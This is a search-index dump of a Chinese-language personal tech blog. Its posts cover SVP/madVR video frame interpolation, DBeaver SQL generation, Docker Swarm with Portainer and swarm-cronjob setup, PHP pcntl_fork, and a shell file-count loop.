渲染器配置教程（2016.08.13 更新） | VCB-Studio 10Bit 看你螢幕有沒有支援，沒有的話就設定 8Bit。 色彩設定 0 ~ 255。 安裝 SVP，預設安裝不用設定，可以把 SVPtube 移除。 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:8:1","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"xySubFilter 安裝 xySubFilter 字幕設定，下載來源請參考上方。 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:8:2","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"MPC-HC 設定 大部分 SVP 都會幫你設定，只要設定少部分就可以了。 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:8:3","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"MadVR 設定 這邊假如你螢幕沒有 10Bit，這邊第二個就不用調整，預設為auto。 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:8:4","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"SVP 腳本設定 參考: 黑米奇SVP: SmoothVideo Project 系列（一）　－　安裝丶簡易設定（2022-04-03更新） SVP 設定 設定黑米奇SVP: 測試筆記：SVP最新測試版參數beta script（2022-05-02 更新）腳本，現在電腦應該都不差，所以就選擇20220502_Decimate，安裝這邊就不特別敘述，因為不知道後續版本會不會調整。 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:8:5","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"效能調整 注意 Ctrl + J dropped frame \u0026 CPU GPU 溫度和使用率，可以找相關設定調低。 為什麼要注意這幾項?人眼有時候不方便看出缺失，但從科學角度去判斷是否達到補真最佳化，可參考以下三點，不過大部分我查報資料去看dropped frame很容易發生。 其中要注意的有幾處 dropped frames丶delayed frames丶presentation glitches 這幾項正常來說都要低於10， 不過在影片開始丶暫停丶跳轉時，這三項數值上升是很常見的， 但影片播放中，這三項的數值不應該上升。 參考: 黑米奇SVP: 進階教程系列（二）　－　視訊渲染濾鏡 madVR（2022-03-05更新） 我上面都是設定 NGU Sharp heigh ，但是 GPU 吃到 90% 和嘯叫很大聲，所以我這邊就先調低設定 NGU Sharp meduim，自己畫面看得爽就好。XD ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:8:6","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"最近公司兩台 DB 資料不一致 我可以直接使用 Dbeaver 生產 SQL 但我發現相關欄位另外一台 DB 沒有 移除爛為在 Editor 欄位和數值非常傷眼睛又很花時間 後來發現 Dbeaver 能解決問題 ","date":"2019-12-19","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E8%AA%BF%E6%95%B4-INERT-UPDATE-SQL-%E8%AA%9E%E6%B3%95/:0:0","tags":["sql"],"title":"快速調整 INERT / UPDATE SQL 語法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E8%AA%BF%E6%95%B4-INERT-UPDATE-SQL-%E8%AA%9E%E6%B3%95/"},{"categories":["SQL"],"content":"Dbeaver 生產 SQL SQL Generation · dbeaver/dbeaver Wiki 在查詢可以用以上連結方法生產 不過，如何移除不需要的欄位呢? 其實我發現用Data Filters · dbeaver/dbeaver Wiki 可以移除你不想要的欄位 生產 INSERT / UPDATE 語法 UPDATE 建議帶入 PK 這樣產生 SQL 比較沒問題 ","date":"2019-12-19","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E8%AA%BF%E6%95%B4-INERT-UPDATE-SQL-%E8%AA%9E%E6%B3%95/:1:0","tags":["sql"],"title":"快速調整 INERT / UPDATE SQL 語法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E8%AA%BF%E6%95%B4-INERT-UPDATE-SQL-%E8%AA%9E%E6%B3%95/"},{"categories":["SQL"],"content":"手動自己建立 DB 首先需要自己 create table(通常會用匯出) INSERT INTO 資料再作刪除欄位 匯出 SQL 目前覺得第一個方法比較實用 有想到更好的方法再回來補 拿到 CSV 資料可以用 csv 快速建立 MySQL 資料表方法 | 程式狂想筆記 Importing a CSV into a database using DBeaver | Just Numbers \u0026 Things ","date":"2019-12-19","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E8%AA%BF%E6%95%B4-INERT-UPDATE-SQL-%E8%AA%9E%E6%B3%95/:2:0","tags":["sql"],"title":"快速調整 INERT / UPDATE SQL 語法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E8%AA%BF%E6%95%B4-INERT-UPDATE-SQL-%E8%AA%9E%E6%B3%95/"},{"categories":["Docker"],"content":"基本教學網站 twtrubiks/docker-swarm-tutorial: Docker Swarm 基本教學 - 從無到有 Docker-Swarm-Beginners-Guide📝 Docker Swarm 管理节点高可用分析 — outmanzzq 由於上面網站都教的非常清楚 我這邊只記錄如何操作跟小筆記(或我覺得重要的) 不會詳細介紹，我覺得以上都說得很細 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:1:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"managers 後續有相關指令 managers 才可以執行 (EX: docker service, docker node) 之後下的指令是要在 manager 用 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:1:1","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"worker manager 會分配 task 給 work 用 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:1:2","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"基本連線 要如何加入 manger 或 worker 呢? 其實只要看 docker swarm join-token manager 或 docker swarm join-token worker 就能看到要加入 manager / worker 指令 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:2:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"docker node docker node ls 可以看到所有加入的 node ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:3:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"docker service docker service 簡單來說就像 docker run 的 swarm 版。 只能在 manager 執行，會自動分配在 node 執行 docker service create –name=my_nginx nginx docker service create –detach=false –name my_nginx –mode replicated nginx docker service update docker service update –publish-add 80 my_nginx ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:4:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"scale docker service scale my_nginx=5 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:4:1","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"兩種模式 replicated:簡單說就是自動分配 global :簡單說就是全部 node 都裝 預設 replicated Docker Swarm概念与基本用法 · 零壹軒·笔记 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:4:2","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"關掉 service docker dervice scale my_xxx=0 docker service rm my_xxx ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:4:3","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"docker 查看 docker service ps ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:4:4","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"查看日誌 docker service log ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:4:5","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"docker stack 簡單來說， docker stack 就是 docker compose 的 swarm 版本。 docker stack deploy –compose-file=portainer-agent-stack.yml portainer ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:5:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"portainer 在使用 portainer 新增機器(endpoint) 會有 agent 跟 docker 選擇 docker ，由於 docker swarm 是叢集，所以部份建立 container 要去不同 endpint (node) 看東西 使用 agent 同一台 endpoint 就能看到全部 不過哪個比較好，我還沒有確定，我們公司是用 docker 設定 agent 沒有很順利，後來用完在此紀錄 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:6:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"agent $ curl -L https://downloads.portainer.io/portainer-agent-stack.yml -o portainer-agent-stack.yml $ docker stack deploy --compose-file=portainer-agent-stack.yml portainer 官網設定會有很大問題，後來發現只要是 portainer 用 stack 部屬就會有問題(卡在一開始 Load 登入頁面) 不過單獨使用 portainer container 就沒這個問題 #docker run -d -p 9000:9000 -p 8000:8000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer # 可使用 docker swarm 注意 我把 volume 拿掉了 docker service create \\ --name portainer \\ --publish 9000:9000 \\ --publish 8000:8000 \\ --replicas=1 \\ --constraint 'node.role == manager' \\ # --mount type=bind,src=//path/on/host/data,dst=/data \\ ##測試用，所以這個拿掉 portainer/portainer curl -L https://downloads.portainer.io/agent-stack.yml -o agent-stack.yml \u0026\u0026 docker stack deploy --compose-file=agent-stack.yml portainer-agent 在隨便加入一個到 endpoint 就可以了 至於官方的不知道為什麼不能用? 目前找不到方法…(我是在 play with docker 跑的) 也有可能跟環境問題 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:6:1","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"agent 跟 docker 差異 192.168.1.17 有兩個，有一個是 agent 跟 docker 你會發現 agent 跟別的 agent 數量是一樣的 照道理可能加一個 agent 就可以了 Portainer一个轻量级的Docker环境管理UI_Kubernetes中文社区 Portainer 透過 TLS 認證 - Yi Yang’s Blog ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:6:2","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"使用 play with docker 做 manager 和 worker 有預設三個 template 我後來發現不是每一個 template 都有幫你做 swarm join 所以建議良好習慣使用 docker node ls 查看有哪些加入 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:7:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"history 預設是 5 個 linux - How to clear Docker task history - Stack Overflow docker swarm update –task-history-limit 5 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:8:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"使用 swarm volume 可能問題 有時間研究再記錄 Docker集群管理Swarm数据持久化 - Bigberg - 博客园 “三剑客”之Swarm应用数据持久化管理（volume 、bind 、 nfs）-DevOps(甘兵)-51CTO博客 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:9:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"swarm conjob 聽說 swarm 可以設定排程 我搜尋一下完全沒有看到 看到介紹有 schedule ，我以為內建應該會有排程東西，不過我猜這個跟 docker service 可能有關係 不過最後還是找到 crazy-max/swarm-cronjob: 📅 Create jobs on a time-based schedule on Docker 🐳 Swarm 好像新增 label 就能設定排程 不過有看到類似看到每月最後一天執行程式 看到有人建議用 每月第一天 之前有寫過這篇解決排程 crontab 時間設定月底執行方法 | 程式狂想筆記 由於我公司的主機用UTC時間，但設定跟程式排程不是UTC時間 所以必須使用這個方式完成 有空在補這個 2019-12-09 今天嘗試了一夏swarm-job 架設上非常方便 但有幾點要特別注意 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:10:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"安裝 swarm-cronjob 可以用 play wtih docker 測試，開 template 3 個 manager 2 個 worker 方法跟上面一樣 docker service create \\ --name portainer \\ --publish 9000:9000 \\ --publish 8000:8000 \\ --replicas=1 \\ --constraint 'node.role == manager' \\ portainer/portainer curl -L https://downloads.portainer.io/agent-stack.yml -o agent-stack.yml \u0026\u0026 docker stack deploy --compose-file=agent-stack.yml portainer-agent ## 安裝 swarm-cronjob docker service create --name swarm_cronjob \\ --mount type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock \\ --env \"LOG_LEVEL=info\" \\ --env \"LOG_JSON=false\" \\ --constraint \"node.role == manager\" \\ crazymax/swarm-cronjob 其他更多方式看官方文件 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:10:1","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"執行注意 Set command to run the task command 需要下 command Set mode to replicated (default) 使用 replicated mode Set replicas to 0 to avoid running task as soon as the service is deployed 一開始設定replicas=0，否則會議開始就會跑 Set restart_policy.condition to none. This is needed for a cronjob, otherwise the task will restart automatically restart_policy 請設定 none ，否則一開始會一直執行 docker service create --name=my_hello --replicas=0 --restart-condition=none --label swarm.cronjob.enable=\"true\" --label swarm.cronjob.schedule=\"*/2 * * * *\" hello-world ./hello 官方可以帶的 label，前面兩個是必帶 swarm.cronjob.enable : Set to true to enable the cronjob (required) swarm.cronjob.schedule : CRON expression format to use. (required) swarm.cronjob.skip-running : Do not start a job if the service is currently running (optional) swarm.cronjob.replicas : Number of replicas to set on schedule in replicated mode. (optional, default 1) 有空再放 stack yml ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:10:2","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"agent mode global 我發現我只要新增 node 加入 swarm，就會自動安裝 agent portainer 什麼設定都不用做!!!!太猛啦 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:10:3","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"相關連結 加入最愛的連結，但我沒整理，我就放一些彩蛋吧XD [Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Docker Stack多服务编排 Docker Swarm 進階實戰 (1) - Super9 用 Docker Swarm 部署你的雲服務 (實作篇) - Soul \u0026 Shell Blog docker 快速學習自我挑戰 Day7 | Vincent’s Corner [Docker 學習筆記] Run/Compose/Swarm Mode 幾個運行方式基本概念 – Tiger-Workshop Blog 全网最通俗易懂的Kafka入门！ - Java3y - 博客园 Docker集群管理Swarm数据持久化 - Bigberg - 博客园 Docker Swarm叢集實踐——部署篇 - IT閱讀 Apache的三種工作模式（prefork/worker/Event） Running Cron Jobs container on 5-Node Docker Swarm Mode Cluster – Collabnix docker叢集管理工具–Swarm以及Portainer安裝 - IT閱讀 How to set the last day of the month? · Issue #234 · robfig/cron Portainer一个轻量级的Docker环境管理UI_Kubernetes中文社区 使用 Haproxy + Keepalived 构建基于 Docker 的高可用负载均衡服务（一） - CODING 博客 Haproxy+Keepalived高可用环境部署梳理（主主和主从模式）-眼眸刻着你的微笑-51CTO博客 containers - How can I remove shutdown Docker Service tasks after a rolling update? - Stack Overflow Docker Swarm 实战 - rj-bai ’s Blog ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:11:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["Docker"],"content":"針對 CPU 架構選擇 image docker pull [OPTIONS] NAME[:TAG|@DIGEST] 如： docker pull ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f8787 // 通过如下命令指定arch: docker run -it –rm : arch=linux/arm64 方法三就不寫了，看起來很麻煩 參考:docker pull 指定 os/arch_Yu的博客-CSDN博客 ","date":"2019-12-07","objectID":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/:12:0","tags":["docker","swarm"],"title":"docker swarm 一些指令相關整理","uri":"/blog/posts/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/"},{"categories":["PHP"],"content":"之前在 swoole 有簡單紀錄 pcntl_fork 我在寫那篇之前，以為 pcntl_fork 執行子程序大概不會收到執行結果 不過今天仔細看，可以接收到程式執行結果 但還是不能傳接收參數值 ","date":"2019-11-21","objectID":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/:0:0","tags":["php"],"title":"php pcntl_fork 多程序小記","uri":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"簡單範例 多采多姿的程式筆記: 利用PHP寫Multi Process程式 1 - 產生子程序 基本上裡面範例可以直接拿來改 建議先了解 fork 子程序概念會是最好 多采多姿的程式筆記: 利用PHP用寫Multi Process程式 - 2 使用信號機 ftok swoole 裡面有 Message Quene 有提到 ","date":"2019-11-21","objectID":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/:1:0","tags":["php"],"title":"php pcntl_fork 多程序小記","uri":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"pcntl_wait、pcntl_waitpid php多进程总结 - leezhxing - 博客园備份圖 裡面也有提 殭屍程序 八克里: PHP Multi Process 程式以 PING 多主機應用為範例 備份mylinux_document/ping.php at master · malagege/mylinux_document ","date":"2019-11-21","objectID":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/:2:0","tags":["php"],"title":"php pcntl_fork 多程序小記","uri":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"DB 連線問題 目前有簡單實驗，父子 DB 連線是可以共用的 但不建議這樣做，同時在跑的程式結果有做 交易(translation) 就很麻煩 所以還是分開來會比較好 pcntl_fork 導致 MySQL server has gone away 解決方案 - AllenChou - 博客園 備份圖 2019-12-04 建議做 fork 時候最好先把連線關掉 完成重新做連線會比較好 否則會預到很多問題 ","date":"2019-11-21","objectID":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/:3:0","tags":["php"],"title":"php pcntl_fork 多程序小記","uri":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"Daemon PHP实现daemon | Nginlion 備份圖 如何优雅地运行一个 Daemon PHP多进程编程 | 第二世 備份圖 ","date":"2019-11-21","objectID":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/:4:0","tags":["php"],"title":"php pcntl_fork 多程序小記","uri":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"彩蛋 shaneharter/PHP-Daemon: Build production-ready Daemons using PHP 5.3+. Build fault-tolerant applications without the boilerplate. 深入理解Linux修改hostname - 潇湘隐者 - 博客园 Bash 程式設計教學：平行執行背景子行程，用 wait 等待工作結束 - G. T. Wang ","date":"2019-11-21","objectID":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/:4:1","tags":["php"],"title":"php pcntl_fork 多程序小記","uri":"/blog/posts/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":" for i in */ .*/ ; do echo -n $i\": \" ; (find \"$i/\" -maxdepth 1 -mindepth 1 -type d | wc -l) ; done mindepth 0 數字是指.本層開始搜尋的(包含.)自己，但通常會用 1(不包含 .) maxdepth 1 數字是使.往後搜尋資料夾 for i in */ .*/ ; do echo -n $i\": \" ; (find \"$i\" -maxdepth 3 -type f -name \"*.docx\" | wc -l) ; done Recursively counting files in a Linux directory - Stack Overflow ","date":"2019-11-12","objectID":"/blog/posts/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/:0:0","tags":["shell","linux"],"title":"Shell 